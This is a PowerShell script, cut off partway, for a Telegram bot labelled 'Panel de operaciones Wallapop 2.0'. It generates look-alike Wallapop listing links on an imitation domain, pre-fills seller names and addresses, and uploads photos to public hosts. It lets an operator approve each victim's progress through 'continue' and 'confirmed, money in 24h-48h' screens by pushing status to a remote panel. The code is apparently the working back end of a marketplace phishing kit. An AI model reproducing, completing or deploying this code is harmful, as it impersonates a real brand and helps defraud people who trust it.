$ErrorActionPreference = 'Continue'
$Raiz = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $Raiz

$Cfg = Get-Content (Join-Path $Raiz 'config.json') -Raw | ConvertFrom-Json
$Token = $Cfg.token
$Puerto = if ($Cfg.port) { [int]$Cfg.port } else { 3000 }
$Cultura = [Globalization.CultureInfo]::GetCultureInfo('es-ES')

$DataDir = Join-Path $Raiz 'data'
if (!(Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir | Out-Null }
$DbFile = Join-Path $DataDir 'productos.json'
$OffFile = Join-Path $DataDir 'offset.json'

function To-Hash($o) {
  $h = @{}
  if ($o) { $o.PSObject.Properties | ForEach-Object { $h[$_.Name] = $_.Value } }
  return $h
}

$Db = @{}
if (Test-Path $DbFile) {
  try {
    $raw = Get-Content $DbFile -Raw -Encoding UTF8 | ConvertFrom-Json
    $items = if ($raw.products) { $raw.products } else { $raw }
    foreach ($prop in $items.PSObject.Properties) {
      if ($prop.Name -ne 'products' -and $prop.Name -ne 'activeId' -and $prop.Value) {
        $h = To-Hash $prop.Value
        if ($h.ContainsKey('titulo') -or $h.ContainsKey('precio') -or $h.ContainsKey('id')) {
          $h['id'] = $prop.Name
          $Db[$prop.Name] = $h
        }
      }
    }
  } catch { }
}

function Save-Db {
  $cleanDb = @{}
  foreach ($k in $Db.Keys) {
    if ($k -ne 'products' -and $k -ne 'activeId' -and $Db[$k]) {
      $cleanDb[$k] = $Db[$k]
    }
  }
  $actId = if ($Script:Activo -and $Script:Activo -ne 'products' -and $Script:Activo -ne 'activeId') { [string]$Script:Activo } else { '' }
  if (-not $actId -and $cleanDb.Keys.Count -gt 0) {
    $actId = @($cleanDb.Keys)[0]
    $Script:Activo = $actId
  }

  $jsonStr = $cleanDb | ConvertTo-Json -Depth 8
  $jsonWrap = @{ products = $cleanDb; activeId = $actId } | ConvertTo-Json -Depth 8
  $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
  [System.IO.File]::WriteAllText($DbFile, $jsonStr, $utf8NoBom)
  [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.json'), $jsonWrap, $utf8NoBom)
  [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
  if ($actId) {
    [System.IO.File]::WriteAllText((Join-Path $DataDir 'activo.txt'), $actId, $utf8NoBom)
  }
  $WebDir = Join-Path $Raiz 'web'
  if (Test-Path $WebDir) {
    try {
      [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.json'), $jsonWrap, $utf8NoBom)
      [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
      $WebDataDir = Join-Path $WebDir 'data'
      if (Test-Path $WebDataDir) {
        [System.IO.File]::WriteAllText((Join-Path $WebDataDir 'productos.json'), $jsonStr, $utf8NoBom)
        if ($actId) {
          [System.IO.File]::WriteAllText((Join-Path $WebDataDir 'activo.txt'), $actId, $utf8NoBom)
        }
      }
    } catch { }
  }
  if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
    try {
      Invoke-RestMethod -Uri ("{0}/api.php?action=sync_products" -f $Script:Base) -Method Post -Body $jsonWrap -ContentType "application/json; charset=utf-8" -TimeoutSec 5 | Out-Null
    } catch { }
  }
}

$Offset = 0
if (Test-Path $OffFile) { try { $Offset = [long]((Get-Content $OffFile -Raw | ConvertFrom-Json).offset) } catch { } }
function Save-Offset { @{ offset = $Offset } | ConvertTo-Json | Set-Content -Path $OffFile -Encoding UTF8 }

function Esc($s) {
  if ($null -eq $s) { return '' }
  return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
}
function Eur($n, [switch]$Dec) {
  $v = 0.0
  [double]::TryParse([string]$n, [ref]$v) | Out-Null
  $sym = [char]0x20AC
  if ($Dec) { return ($v.ToString('N2', $Cultura) + " $sym") }
  return ($v.ToString('N0', $Cultura) + " $sym")
}
function Num($s) {
  $v = 0.0
  if ([double]::TryParse(([string]$s).Replace('.', '').Replace(',', '.'), [ref]$v)) {
    return [math]::Round($v, 2)
  }
  return $null
}
function Nuevo-Id {
  $nums = -join (1..7 | ForEach-Object { Get-Random -Minimum 0 -Maximum 10 })
  return ('AD' + $nums)
}
function Ip-Lan {
  try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress
    if ($ip) { return $ip }
  } catch { }
  return 'localhost'
}
$Script:Base = if ($Cfg.publicUrl) { $Cfg.publicUrl.TrimEnd('/') } elseif ($Cfg.base_url) { $Cfg.base_url.TrimEnd('/').Replace('/a', '') } else { 'http://localhost:3000' }

function Send-Tg($metodo, $carga) {
  try {
    $json = $carga | ConvertTo-Json -Depth 10 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    return Invoke-RestMethod -Uri ("https://api.telegram.org/bot{0}/{1}" -f $Token, $metodo) -Method Post `
      -ContentType 'application/json; charset=utf-8' -Body $bytes -TimeoutSec 30
  } catch { return $null }
}
function Responder($chat, $texto, $extra) {
  $p = @{ chat_id = $chat; text = $texto; parse_mode = 'HTML'; disable_web_page_preview = $true }
  if ($extra) { foreach ($k in $extra.Keys) { $p[$k] = $extra[$k] } }
  Send-Tg 'sendMessage' $p | Out-Null
}

$Script:Ayuda = @'
<b>🟢 Panel de operaciones Wallapop 2.0</b>

/nuevo → crea un producto y te doy su enlace
/productos → lista los enlaces
/editar ID → deja un producto activo

<b>Con un producto activo</b>
/titulo texto
/precio número
/descripcion texto
/importe número
/nombre texto
/direccion texto
/articulo texto
/foto + imagen · /quitarfotos
/url https://tu-sitio.com · cambiar dominio

/borrar ID · /cancelar · /ayuda
'@

function Url-Producto($p) {
  if (-not $p) { return $Script:Base }
  $fList = @()
  if ($p['fotos']) {
    foreach ($f in @($p['fotos'])) {
      if ($f -is [string] -and $f.Length -lt 1500 -and ($f.StartsWith('http') -or $f.StartsWith('/'))) {
        $fList += $f
      }
    }
  }

  $cleanId = [string]$p['id']
  $cleanBase = $Script:Base.TrimEnd('/')
  if ($cleanBase -like '*localhost*' -or $cleanBase -like '*127.0.0.1*' -or -not $cleanBase) {
    $cleanBase = 'https://wallaaaa.netlify.app'
  }
  $prodUrl = if ($cleanBase.EndsWith('/a')) { ("{0}/{1}" -f $cleanBase, $cleanId) } else { ("{0}/a/{1}" -f $cleanBase, $cleanId) }

  $minObj = @{
    id = $cleanId
    titulo = [string]$p['titulo']
    precio = [double]$p['precio']
    precioArticulo = if ($p['precioArticulo']) { [double]$p['precioArticulo'] } else { [double]$p['precio'] }
    descripcion = if ($p['descripcion']) { [string]$p['descripcion'] } else { '' }
    nombre = if ($p['nombre']) { [string]$p['nombre'] } else { 'Sofía Chamizo' }
    direccion = if ($p['direccion']) { [string]$p['direccion'] } else { '' }
    articulo = if ($p['articulo']) { [string]$p['articulo'] } else { [string]$p['titulo'] }
    fotos = $fList
  }

  try {
    $json = $minObj | ConvertTo-Json -Compress -Depth 4
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $b64 = [Convert]::ToBase64String($bytes)
    $urlConP = ("{0}?p={1}" -f $prodUrl, [System.Uri]::EscapeDataString($b64))
    if ($urlConP.Length -lt 2000) {
      return $urlConP
    }
  } catch { }

  return $prodUrl
}

function Resumen($p) {
  return ('<b>' + (Esc $p['titulo']) + '</b>' + "`n" + (Eur $p['precio']) + ' · ' + @($p['fotos']).Count + ' foto(s)' + "`n" + 'ID: <code>' + $p['id'] + '</code>')
}

function Notificar($chat, $p) {
  $urlLimpia = $Script:Base + '/a/' + $p['id']
  $urlConDatos = Url-Producto $p
  $vendedor = if ($p['nombre']) { $p['nombre'] } else { 'Sofía Chamizo' }
  $titulo = if ($p['titulo']) { $p['titulo'] } else { 'Artículo Wallapop' }
  $id = $p['id']

  $cap = "<blockquote><b>" + (Esc $vendedor) + " ➔ " + (Esc $titulo) + "</b>`n" +
         $urlLimpia + "</blockquote>`n`n" +
         "<blockquote>🍥 Producto creado con éxito ❞</blockquote>`n`n" +
         "🇪🇸 <u>Wallapop</u> 2.0 • #" + $id + " 📇"

  $fila = @(@{ text = '🍥 Abrir anuncio ❞'; url = $urlConDatos })
  $kb = @{ inline_keyboard = @(, $fila) }

  # Intentar foto pública primero
  $pubPhoto = $null
  if ($p['fotos']) {
    foreach ($f in @($p['fotos'])) {
      if ($f -is [string] -and $f.StartsWith('http') -and $f -notlike '*api.telegram.org*') {
        $pubPhoto = $f
        break
      }
    }
  }

  $tgPhoto = if ($pubPhoto) {
    $pubPhoto
  } elseif ($p['tg_fotos'] -and @($p['tg_fotos']).Count -gt 0) {
    @($p['tg_fotos'])[0]
  } else { $null }

  if ($tgPhoto) {
    $r = Send-Tg 'sendPhoto' @{ chat_id = $chat; photo = $tgPhoto; caption = $cap; parse_mode = 'HTML'; reply_markup = $kb }
    if (-not $r -or -not $r.ok) {
      Send-Tg 'sendMessage' @{ chat_id = $chat; text = $cap; parse_mode = 'HTML'; reply_markup = $kb; disable_web_page_preview = $false } | Out-Null
    }
  } else {
    Send-Tg 'sendMessage' @{ chat_id = $chat; text = $cap; parse_mode = 'HTML'; reply_markup = $kb; disable_web_page_preview = $false } | Out-Null
  }
}

function Upload-Photo-Public($imgBytes, $fileName) {
  # 1. Catbox.moe
  try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyStream = New-Object System.IO.MemoryStream
    $h = "--$boundary$LF" +
         "Content-Disposition: form-data; name=`"reqtype`"$LF$LF" +
         "fileupload$LF" +
         "--$boundary$LF" +
         "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"$LF" +
         "Content-Type: image/jpeg$LF$LF"
    $hBytes = [System.Text.Encoding]::ASCII.GetBytes($h)
    $bodyStream.Write($hBytes, 0, $hBytes.Length)
    $bodyStream.Write($imgBytes, 0, $imgBytes.Length)
    $f = "$LF--$boundary--$LF"
    $fBytes = [System.Text.Encoding]::ASCII.GetBytes($f)
    $bodyStream.Write($fBytes, 0, $fBytes.Length)

    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $resBytes = $wc.UploadData("https://catbox.moe/user/api.php", $bodyStream.ToArray())
    $resStr = [System.Text.Encoding]::UTF8.GetString($resBytes).Trim()
    if ($resStr.StartsWith("https://files.catbox.moe/")) {
      return $resStr
    }
  } catch { }

  # 2. Litterbox fallback
  try {
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyStream = New-Object System.IO.MemoryStream
    $h = "--$boundary$LF" +
         "Content-Disposition: form-data; name=`"reqtype`"$LF$LF" +
         "fileupload$LF" +
         "--$boundary$LF" +
         "Content-Disposition: form-data; name=`"time`"$LF$LF" +
         "72h$LF" +
         "--$boundary$LF" +
         "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"$LF" +
         "Content-Type: image/jpeg$LF$LF"
    $hBytes = [System.Text.Encoding]::ASCII.GetBytes($h)
    $bodyStream.Write($hBytes, 0, $hBytes.Length)
    $bodyStream.Write($imgBytes, 0, $imgBytes.Length)
    $f = "$LF--$boundary--$LF"
    $fBytes = [System.Text.Encoding]::ASCII.GetBytes($f)
    $bodyStream.Write($fBytes, 0, $fBytes.Length)

    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $resBytes = $wc.UploadData("https://litterbox.catbox.moe/resources/internals/api.php", $bodyStream.ToArray())
    $resStr = [System.Text.Encoding]::UTF8.GetString($resBytes).Trim()
    if ($resStr.StartsWith("http")) {
      return $resStr
    }
  } catch { }

  return $null
}

function Foto-Url($msg) {
  try {
    $lista = @($msg.photo)
    if ($lista.Count -eq 0) { return $null }
    $photoObj = $lista[$lista.Count - 1]
    $fid = $photoObj.file_id
    $r = Send-Tg 'getFile' @{ file_id = $fid }
    if ($r -and $r.ok) {
      $filePath = $r.result.file_path
      $tgUrl = ("https://api.telegram.org/file/bot{0}/{1}" -f $Token, $filePath)
      $fileName = ("img_" + (Get-Date -Format 'yyyyMMddHHmmssfff') + ".jpg")
      
      $webClient = New-Object System.Net.WebClient
      $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
      $imgBytes = $webClient.DownloadData($tgUrl)
      
      # 1. Guardar copia local de respaldo
      try {
        $photosDir = Join-Path $Raiz 'web\photos'
        if (!(Test-Path $photosDir)) { New-Item -ItemType Directory -Path $photosDir | Out-Null }
        [System.IO.File]::WriteAllBytes((Join-Path $photosDir $fileName), $imgBytes)
      } catch { }

      # 2. Subir directamente a host público (Catbox / Litterbox)
      $finalUrl = Upload-Photo-Public $imgBytes $fileName
      if (-not $finalUrl) {
        $finalUrl = "/photos/" + $fileName
      }

      return @{ url = $finalUrl; file_id = $fid; tg_url = $tgUrl; file_path = $filePath }
    }
  } catch { }
  return $null
}

$Script:Wizard = $null
$WizFile = Join-Path $DataDir 'wizard.json'
if (Test-Path $WizFile) {
  try {
    $rawWiz = Get-Content $WizFile -Raw | ConvertFrom-Json
    $Script:Wizard = To-Hash $rawWiz
    if ($Script:Wizard -and $Script:Wizard['fotos']) {
      $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
    }
  } catch { }
}
function Save-Wizard {
  if ($Script:Wizard) {
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($WizFile, ($Script:Wizard | ConvertTo-Json -Depth 5), $utf8)
  } else {
    if (Test-Path $WizFile) { Remove-Item $WizFile -Force -ErrorAction SilentlyContinue }
  }
}
$Script:Activo = ''
$ActFile = Join-Path $DataDir 'activo.txt'
if (Test-Path $ActFile) { $Script:Activo = (Get-Content $ActFile -Raw).Trim() }
function Set-Activo($id) { $Script:Activo = $id; Set-Content -Path $ActFile -Value $id -Encoding UTF8 }

$ChatFile = Join-Path $DataDir 'chat.txt'
$Script:UltimoChat = ''
if (Test-Path $ChatFile) { try { $Script:UltimoChat = (Get-Content $ChatFile -Raw -Encoding UTF8).Trim() } catch { } }

$Script:TxEstados = @{}

function Handle-Update($u) {
  if ($u.callback_query) {
    $cq = $u.callback_query
    $cqId = [string]$cq.id
    $cqData = [string]$cq.data
    $cqChat = $cq.message.chat.id
    $cqMsgId = $cq.message.message_id
    $Script:UltimoChat = $cqChat
    try { Set-Content -Path $ChatFile -Value $cqChat -Encoding UTF8 } catch { }

    if ($cqData -match '^continuar_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'continue'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'continue' }

      # Notificar al hosting inmediatamente
      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
        try {
          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=continue" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
        } catch { }
      }

      # Publicar estado en Telegram bot description para que la web (Netlify o local) lo lea al instante
      Send-Tg 'setMyDescription' @{ description = ("status:continue:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "✅ Aprobado. El cliente avanza a Confirmar." } | Out-Null
      $filaDone = @(@{ text = '✅ CONTINUADO (Confirmar)'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaDone) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -match '^confirmar_again_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'confirmado_final'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'confirmado_final' }

      # Notificar al hosting inmediatamente
      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
        try {
          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=confirmado_final" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
        } catch { }
      }

      # Publicar estado en Telegram bot description
      Send-Tg 'setMyDescription' @{ description = ("status:confirmado_final:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "✅ Confirmación aprobada. Pantalla 24h-48h activada." } | Out-Null
      $filaDone = @(@{ text = '✅ CONFIRMADO (Dinero en 24h-48h)'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaDone) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -match '^error_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'error'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'error' }

      # Notificar al hosting inmediatamente
      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
        try {
          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=error" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
        } catch { }
      }

      # Publicar estado en Telegram bot description
      Send-Tg 'setMyDescription' @{ description = ("status:error:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "❌ Marcado como Error." } | Out-Null
      $filaErr = @(@{ text = '❌ ERROR MARCADO'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaErr) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -eq 'noop') {
      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "Esta acción ya fue realizada." } | Out-Null
      return
    }
    return
  }

  $msg = if ($u.message) { $u.message } else { $u.edited_message }
  if (-not $msg) { return }
  $chat = $msg.chat.id
  $Script:UltimoChat = $chat
  try { Set-Content -Path $ChatFile -Value $chat -Encoding UTF8 } catch { }
  $texto = ''
  if ($msg.text) { $texto = $msg.text.Trim() }

  if ($msg.photo) {
    if ($Script:Wizard -and $Script:Wizard['step'] -eq 'fotos') {
      $fotoData = Foto-Url $msg
      if ($fotoData) {
        if (-not $Script:Wizard['fotos']) { $Script:Wizard['fotos'] = @() }
        $Script:Wizard['fotos'] = @($Script:Wizard['fotos']) + $fotoData.url
        if ($fotoData.file_id) {
          if (-not $Script:Wizard['tg_fotos']) { $Script:Wizard['tg_fotos'] = @() }
          $Script:Wizard['tg_fotos'] = @($Script:Wizard['tg_fotos']) + $fotoData.file_id
        }
        Save-Wizard
        $msgFotoTxt = "🖼 <b>Foto " + @($Script:Wizard['fotos']).Count + " recibida y subida correctamente</b>`n"
        if ($fotoData.url.StartsWith("http")) {
          $msgFotoTxt += "🔗 Enlace directo generado:`n<code>" + $fotoData.url + "</code>`n`n"
        }
        $msgFotoTxt += "Manda más fotos o escribe /listo para terminar."
        Responder $chat $msgFotoTxt
      } else { Responder $chat '⚠️ No pude descargar la imagen, prueba otra vez.' }
      return
    }
    if ($Script:Activo -and $Db.ContainsKey($Script:Activo)) {
      $fotoData = Foto-Url $msg
      if ($fotoData) {
        if (-not $Db[$Script:Activo]['fotos']) { $Db[$Script:Activo]['fotos'] = @() }
        $Db[$Script:Activo]['fotos'] = @($Db[$Script:Activo]['fotos']) + $fotoData.url
        if ($fotoData.file_id) {
          if (-not $Db[$Script:Activo]['tg_fotos']) { $Db[$Script:Activo]['tg_fotos'] = @() }
          $Db[$Script:Activo]['tg_fotos'] = @($Db[$Script:Activo]['tg_fotos']) + $fotoData.file_id
        }
        Save-Db
        $msgFotoTxt = "✅ <b>Foto subida y añadida al producto activo</b> (" + @($Db[$Script:Activo]['fotos']).Count + ")`n"
        if ($fotoData.url.StartsWith("http")) {
          $msgFotoTxt += "🔗 <code>" + $fotoData.url + "</code>`n`n"
        }
        $msgFotoTxt += (Url-Producto $Db[$Script:Activo])
        Responder $chat $msgFotoTxt
      } else { Responder $chat '⚠️ No pude descargar la imagen.' }
      return
    }
    Responder $chat 'Envía /nuevo o /editar ID antes de mandar fotos.'
    return
  }

  if ($Script:Wizard -and $texto -and -not $texto.StartsWith('/')) {
    switch ($Script:Wizard['step']) {
      'titulo' {
        $Script:Wizard['titulo'] = $texto
        $Script:Wizard['articulo'] = $texto
        $Script:Wizard['step'] = 'precio'
        Save-Wizard
        Responder $chat '2/5 · ¿Precio en euros? (ejemplo: 250)'
        return
      }
      'precio' {
        $n = Num $texto
        if ($null -eq $n) { Responder $chat 'Pon un número válido, por ejemplo 250'; return }
        $Script:Wizard['precio'] = $n
        $Script:Wizard['precioArticulo'] = $n
        $Script:Wizard['step'] = 'nombre'
        Save-Wizard
        Responder $chat '3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)'
        return
      }
      'nombre' {
        $Script:Wizard['nombre'] = $texto
        $Script:Wizard['step'] = 'direccion'
        Save-Wizard
        Responder $chat '4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)'
        return
      }
      'direccion' {
        $Script:Wizard['direccion'] = $texto
        $Script:Wizard['step'] = 'descripcion'
        Save-Wizard
        Responder $chat '5/5 · ¿Descripción del producto? (o pon un . para omitir)'
        return
      }
      'descripcion' {
        $Script:Wizard['descripcion'] = if ($texto -eq '.') { '' } else { $texto }
        $Script:Wizard['step'] = 'fotos'
        Save-Wizard
        Responder $chat '📷 Envía las fotos que quieras y escribe /listo para terminar.'
        return
      }
    }
  }

  if (-not $texto.StartsWith('/')) {
    Responder $chat 'Usa /nuevo para crear un producto o /ayuda para ver los comandos.'
    return
  }

  $i = $texto.IndexOf(' ')
  $cmd = if ($i -lt 0) { $texto } else { $texto.Substring(0, $i) }
  $cmd = $cmd.ToLower().Split('@')[0]
  $arg = if ($i -lt 0) { '' } else { $texto.Substring($i + 1).Trim() }
  $act = if ($Script:Activo -and $Db.ContainsKey($Script:Activo)) { $Db[$Script:Activo] } else { $null }

  switch ($cmd) {
    '/start' { Responder $chat $Script:Ayuda; return }
    '/ayuda' { Responder $chat $Script:Ayuda; return }

    '/nuevo' {
      $Script:Wizard = @{
        step = 'titulo'; id = (Nuevo-Id); fotos = @(); tg_fotos = @()
        nombre = ''; direccion = ''
        descripcion = ''; titulo = ''; articulo = ''; precio = 0; precioArticulo = 0
      }
      Save-Wizard
      Responder $chat '1/5 · ¿Título del producto?'
      return
    }

    '/cancelar' { $Script:Wizard = $null; Save-Wizard; Responder $chat 'Creación cancelada.'; return }

    '/listo' {
      if (-not $Script:Wizard) {
        if (Test-Path $WizFile) {
          try {
            $rawWiz = Get-Content $WizFile -Raw -Encoding UTF8 | ConvertFrom-Json
            $Script:Wizard = To-Hash $rawWiz
            if ($Script:Wizard -and $Script:Wizard['fotos']) {
              $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
            }
          } catch { }
        }
      }
      if (-not $Script:Wizard) { Responder $chat 'No hay ningún producto en creación. Usa /nuevo.'; return }
      $p = $Script:Wizard
      if (-not $p['nombre']) { $p['nombre'] = 'Sofía Chamizo' }
      if (-not $p['direccion']) { $p['direccion'] = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024' }
      if (-not $p['fotos']) { $p['fotos'] = @() } else { $p['fotos'] = @($p['fotos']) }
      $Db[$p['id']] = $p
      Set-Activo $p['id']
      Save-Db
      $Script:Wizard = $null
      Save-Wizard
      Notificar $chat $p
      return
    }

    '/productos' {
      $prodsKeys = @($Db.Keys | Where-Object { $_ -ne 'products' -and $_ -ne 'activeId' -and $Db[$_] })
      if ($prodsKeys.Count -eq 0) { Responder $chat 'Todavía no hay productos. Usa /nuevo.'; return }
      $lineas = foreach ($id in $prodsKeys) {
        '• <b>' + (Esc $Db[$id]['titulo']) + '</b> — ' + (Eur $Db[$id]['precio']) + "`n<code>" + $id + "</code> → " + (Url-Producto $Db[$id])
      }
      Responder $chat ($lineas -join "`n`n")
      return
    }

    '/editar' {
      $argClean = $arg.Trim().TrimStart('#').ToUpper()
      $matchId = $null
      foreach ($k in $Db.Keys) {
        if ($k.ToUpper() -eq $argClean) { $matchId = $k; break }
      }
      if (-not $matchId -or -not $Db.ContainsKey($matchId)) {
        Responder $chat 'Uso: /editar ID (mira /productos)'; return
      }
      Set-Activo $matchId
      Responder $chat ('✏️ Editando:' + "`n" + (Resumen $Db[$matchId]) + "`n" + (Url-Producto $Db[$matchId]))
      return
    }

    '/borrar' {
      $argClean = $arg.Trim().TrimStart('#').ToUpper()
      $matchId = $null
      foreach ($k in $Db.Keys) {
        if ($k.ToUpper() -eq $argClean) { $matchId = $k; break }
      }
      if (-not $matchId -or -not $Db.ContainsKey($matchId)) {
        Responder $chat 'Uso: /borrar ID'; return
      }
      $Db.Remove($matchId)
      if ($Script:Activo -eq $matchId) {
        $remaining = @($Db.Keys | Where-Object { $_ -ne 'products' -and $_ -ne 'activeId' })
        Set-Activo (if ($remaining.Count -gt 0) { $remaining[0] } else { '' })
      }
      Save-Db
      Responder $chat ("🗑 Producto <code>" + $matchId + "</code> borrado.")
      return
    }

    '/foto' { Responder $chat '📷 Envía la imagen y la añado al producto activo.'; return }

    '/quitarfotos' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      $act['fotos'] = @()
      Save-Db
      Responder $chat '🧹 Fotos eliminadas.'
      return
    }

    '/titulo' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      if (-not $arg) { Responder $chat 'Uso: /titulo Nuevo título'; return }
      $act['titulo'] = $arg; Save-Db
      Responder $chat '✅ Título actualizado.'
      return
    }

    '/precio' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      $n = Num $arg
      if ($null -eq $n) { Responder $chat 'Uso: /precio 250'; return }
      $act['precio'] = $n; $act['precioArticulo'] = $n; Save-Db
      Responder $chat ('✅ Precio: ' + (Eur $n))
      return
    }

    '/importe' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      $n = Num $arg
      if ($null -eq $n) { Responder $chat 'Uso: /importe 250,00'; return }
      $act['precioArticulo'] = $n; Save-Db
      Responder $chat ('✅ Importe a recibir: ' + (Eur $n -Dec))
      return
    }

    '/descripcion' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /descripcion Texto'; return }
      $act['descripcion'] = $arg; Save-Db
      Responder $chat '✅ Descripción actualizada.'
      return
    }

    '/nombre' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /nombre Sofía Chamizo'; return }
      $act['nombre'] = $arg; Save-Db
      Responder $chat '✅ Nombre actualizado.'
      return
    }

    '/direccion' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /direccion Calle, número, ciudad, CP'; return }
      $act['direccion'] = $arg; Save-Db
      Responder $chat '✅ Dirección actualizada.'
      return
    }

    '/articulo' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /articulo Texto'; return }
      $act['articulo'] = $arg; Save-Db
      Responder $chat '✅ Artículo actualizado.'
      return
    }

    '/estado' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      Responder $chat ((Resumen $act) + "`n" + (Url-Producto $act))
      return
    }

    { $_ -in '/dominio', '/url' } {
      if (-not $arg) {
        Responder $chat ('Dominio actual: <code>' + $Script:Base + '</code>' + "`n`n" + 'Uso: <code>/url https://tu-sitio.com</code>')
        return
      }
      $nuevo = $arg.Trim().TrimEnd('/')
      if (-not $nuevo.StartsWith('http://') -and -not $nuevo.StartsWith('https://')) { $nuevo = 'https://' + $nuevo }
      $Script:Base = $nuevo
      $Cfg.publicUrl = $nuevo
      $Cfg.base_url = $nuevo + '/a/'
      $Cfg | ConvertTo-Json -Depth 4 | Set-Content -Path (Join-Path $Raiz 'config.json') -Encoding UTF8
      Responder $chat ('✅ Dominio actualizado a: <code>' + $Script:Base + '</code>')
      return
    }

    default { Responder $chat 'Comando no reconocido. Envía /ayuda.' }
  }
}

function Handle-Client($cliente) {
  try {
    $cliente.ReceiveTimeout = 5000
    $stream = $cliente.GetStream()
    $lector = New-Object IO.StreamReader($stream, [Text.Encoding]::ASCII)
    $linea = $lector.ReadLine()
    $contentLen = 0
    while ($true) {
      $h = $lector.ReadLine()
      if ([string]::IsNullOrEmpty($h)) { break }
      if ($h -match 'Content-Length:\s*(\d+)') { $contentLen = [int]$matches[1] }
    }

    $metodoHttp = 'GET'
    $ruta = '/'
    if ($linea) {
      $trozos = $linea.Split(' ')
      if ($trozos.Count -ge 2) { $metodoHttp = $trozos[0].ToUpper(); $ruta = $trozos[1] }
    }
    $ruta = ($ruta -split '\?')[0]

    if ($metodoHttp -eq 'OPTIONS') {
      $cab = "HTTP/1.1 204 No Content`r`nAccess-Control-Allow-Origin: *`r`nAccess-Control-Allow-Methods: GET, POST, OPTIONS`r`nAccess-Control-Allow-Headers: Content-Type`r`nConnection: close`r`n`r`n"
